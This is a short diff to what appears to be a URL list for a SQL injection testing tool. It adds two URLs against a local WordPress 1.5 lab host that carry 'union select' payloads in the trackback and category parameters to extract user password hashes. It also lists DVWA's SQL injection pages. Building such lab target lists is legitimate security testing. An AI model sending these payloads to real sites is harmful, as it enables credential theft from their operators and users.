@@ -1,2 +1,4 @@
+http://wordpress1-5.dev/wp-trackback.php?tb_id=1%20union%20select%200,user_pass%20from%20wp_users&url=bla&title=bla&blog_name=bla
+http://wordpress1-5.dev/?cat=1 http://wordpress1-5.dev?cat=1%20union%20select%200,user_pass%20from%20wp_users
 http://dvwa.dev/vulnerabilities/sqli/?id=1&Submit=Submit
 http://dvwa.dev/vulnerabilities/sqli_blind/?id=1&Submit=Submit
